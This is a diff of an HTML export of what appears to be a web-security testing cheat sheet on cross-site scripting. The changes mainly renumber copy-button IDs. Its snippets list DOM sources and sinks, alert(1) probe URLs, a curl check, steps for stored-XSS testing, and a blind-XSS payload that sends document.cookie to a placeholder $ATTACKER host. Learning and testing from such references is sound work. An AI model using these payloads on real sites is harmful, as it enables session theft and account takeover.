-let res = copyTextToClipboard(`document.URL\ndocument.location\ndocument.location.hash    ← common — hash never sent to server\ndocument.referrer\nwindow.name\n`);copyBtnbtn_a4c93cb083014ebfa432148ee6bcea83.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a4c93cb083014ebfa432148ee6bcea83.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f2b0d625262c47e795c1362782f3edbf=document.querySelector('button[name=btn_f2b0d625262c47e795c1362782f3edbf]');
+copyBtnbtn_f2b0d625262c47e795c1362782f3edbf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`document.URL\ndocument.location\ndocument.location.hash    ← common — hash never sent to server\ndocument.referrer\nwindow.name\n`);copyBtnbtn_f2b0d625262c47e795c1362782f3edbf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f2b0d625262c47e795c1362782f3edbf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1376,11 +1376,11 @@ window.name
 <h3 id="orgd298dcb">Common Sinks (dangerous write operations)</h3>
 <div class="outline-text-3" id="text-orgd298dcb">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_aec782fe44d5419baa8f7a3f5cecdb28>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_7febbd3257e24279b6aabff79b02bb8d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_aec782fe44d5419baa8f7a3f5cecdb28=document.querySelector('button[name=btn_aec782fe44d5419baa8f7a3f5cecdb28]');
-copyBtnbtn_aec782fe44d5419baa8f7a3f5cecdb28.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`innerHTML\ndocument.write()\neval()\nsetTimeout() / setInterval() with string argument\nlocation.href\nsrc attribute assignment\n`);copyBtnbtn_aec782fe44d5419baa8f7a3f5cecdb28.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aec782fe44d5419baa8f7a3f5cecdb28.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7febbd3257e24279b6aabff79b02bb8d=document.querySelector('button[name=btn_7febbd3257e24279b6aabff79b02bb8d]');
+copyBtnbtn_7febbd3257e24279b6aabff79b02bb8d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`innerHTML\ndocument.write()\neval()\nsetTimeout() / setInterval() with string argument\nlocation.href\nsrc attribute assignment\n`);copyBtnbtn_7febbd3257e24279b6aabff79b02bb8d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7febbd3257e24279b6aabff79b02bb8d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1398,11 +1398,11 @@ src attribute assignment
 <h3 id="org2b0f149">Testing DOM XSS</h3>
 <div class="outline-text-3" id="text-org2b0f149">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_9e3b2f80b1d04ece83515b0c630f5c4f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_9477385ea9c54b72835cb9f33d2e1cc8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_9e3b2f80b1d04ece83515b0c630f5c4f=document.querySelector('button[name=btn_9e3b2f80b1d04ece83515b0c630f5c4f]');
-copyBtnbtn_9e3b2f80b1d04ece83515b0c630f5c4f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`// Check the hash — common entry point\nhttps://target.com/page#<img src=x onerror=alert(1)>\n\n// Check URL parameters read by JS\nhttps://target.com/page?name=<script>alert(1)</script>\n\n// Use browser DevTools → Sources → search for sources being passed to sinks\n// Search for: innerHTML, document.write, eval, location.href\n`);copyBtnbtn_9e3b2f80b1d04ece83515b0c630f5c4f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9e3b2f80b1d04ece83515b0c630f5c4f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9477385ea9c54b72835cb9f33d2e1cc8=document.querySelector('button[name=btn_9477385ea9c54b72835cb9f33d2e1cc8]');
+copyBtnbtn_9477385ea9c54b72835cb9f33d2e1cc8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Check the hash — common entry point\nhttps://target.com/page#<img src=x onerror=alert(1)>\n\n// Check URL parameters read by JS\nhttps://target.com/page?name=<script>alert(1)</script>\n\n// Use browser DevTools → Sources → search for sources being passed to sinks\n// Search for: innerHTML, document.write, eval, location.href\n`);copyBtnbtn_9477385ea9c54b72835cb9f33d2e1cc8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9477385ea9c54b72835cb9f33d2e1cc8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1428,11 +1428,11 @@ observe — admin panel, log viewer, support ticket system.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_46a008cf890f47c991d0a05940d6157a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_0158ecaef5554628b087ee1045b97d6b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_46a008cf890f47c991d0a05940d6157a=document.querySelector('button[name=btn_46a008cf890f47c991d0a05940d6157a]');
-copyBtnbtn_46a008cf890f47c991d0a05940d6157a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<!-- Use a callback to confirm execution -->\n<script src=\"https://$ATTACKER/xss.js\"></script>\n<img src=x onerror=\"fetch('https://$ATTACKER/blind?'+document.cookie)\">\n\n<!-- XSS Hunter — dedicated blind XSS platform -->\n<!-- Generates payload, notifies you when it fires with screenshot + cookies -->\n`);copyBtnbtn_46a008cf890f47c991d0a05940d6157a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_46a008cf890f47c991d0a05940d6157a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0158ecaef5554628b087ee1045b97d6b=document.querySelector('button[name=btn_0158ecaef5554628b087ee1045b97d6b]');
+copyBtnbtn_0158ecaef5554628b087ee1045b97d6b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Use a callback to confirm execution -->\n<script src=\"https://$ATTACKER/xss.js\"></script>\n<img src=x onerror=\"fetch('https://$ATTACKER/blind?'+document.cookie)\">\n\n<!-- XSS Hunter — dedicated blind XSS platform -->\n<!-- Generates payload, notifies you when it fires with screenshot + cookies -->\n`);copyBtnbtn_0158ecaef5554628b087ee1045b97d6b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0158ecaef5554628b087ee1045b97d6b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1454,11 +1454,11 @@ let res = copyTextToClipboard(`<!-- Use a callback to confirm execution -->\n<sc
 <h3 id="orgfd98192">Reflected</h3>
 <div class="outline-text-3" id="text-orgfd98192">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_dda053c84f1c49b981845395c76a920e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f59a08f2aae14ea69ce49cad83dbb83a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_dda053c84f1c49b981845395c76a920e=document.querySelector('button[name=btn_dda053c84f1c49b981845395c76a920e]');
-copyBtnbtn_dda053c84f1c49b981845395c76a920e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Inject in URL parameter — test in browser\nhttps://target.com/search?q=<script>alert(1)</script>\n\n# Or via curl — look for unescaped payload in response\ncurl -s \"https://target.com/search?q=<script>alert(1)</script>\" | grep -i \"script\"\n`);copyBtnbtn_dda053c84f1c49b981845395c76a920e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dda053c84f1c49b981845395c76a920e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f59a08f2aae14ea69ce49cad83dbb83a=document.querySelector('button[name=btn_f59a08f2aae14ea69ce49cad83dbb83a]');
+copyBtnbtn_f59a08f2aae14ea69ce49cad83dbb83a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject in URL parameter — test in browser\nhttps://target.com/search?q=<script>alert(1)</script>\n\n# Or via curl — look for unescaped payload in response\ncurl -s \"https://target.com/search?q=<script>alert(1)</script>\" | grep -i \"script\"\n`);copyBtnbtn_f59a08f2aae14ea69ce49cad83dbb83a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f59a08f2aae14ea69ce49cad83dbb83a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1475,11 +1475,11 @@ let res = copyTextToClipboard(`# Inject in URL parameter — test in browser\nht
 <h3 id="orgd19e4f3">Stored</h3>
 <div class="outline-text-3" id="text-orgd19e4f3">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_8b60cd2bf5b24191851de973d6aae9ab>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e81b4bfe86944b1eb605688b21a039b6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8b60cd2bf5b24191851de973d6aae9ab=document.querySelector('button[name=btn_8b60cd2bf5b24191851de973d6aae9ab]');
-copyBtnbtn_8b60cd2bf5b24191851de973d6aae9ab.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Submit payload in any stored input: comment, profile, name, bio\n2. Navigate to where that input is rendered\n3. Check if payload executes\n4. Test inputs rendered for OTHER users — highest impact\n   (admin panels, public profiles, comment sections)\n`);copyBtnbtn_8b60cd2bf5b24191851de973d6aae9ab.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8b60cd2bf5b24191851de973d6aae9ab.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e81b4bfe86944b1eb605688b21a039b6=document.querySelector('button[name=btn_e81b4bfe86944b1eb605688b21a039b6]');
+copyBtnbtn_e81b4bfe86944b1eb605688b21a039b6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Submit payload in any stored input: comment, profile, name, bio\n2. Navigate to where that input is rendered\n3. Check if payload executes\n4. Test inputs rendered for OTHER users — highest impact\n   (admin panels, public profiles, comment sections)\n`);copyBtnbtn_e81b4bfe86944b1eb605688b21a039b6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e81b4bfe86944b1eb605688b21a039b6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1517,7 +1517,7 @@ theft, and actions on behalf of the victim.
 <p>
 <b>Evidence:</b>
 </p>
-<pre class="example" id="orgdbdd30a">
+<pre class="example" id="org37bdb75">
 GET /search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt; HTTP/1.1
 
 HTTP/1.1 200 OK
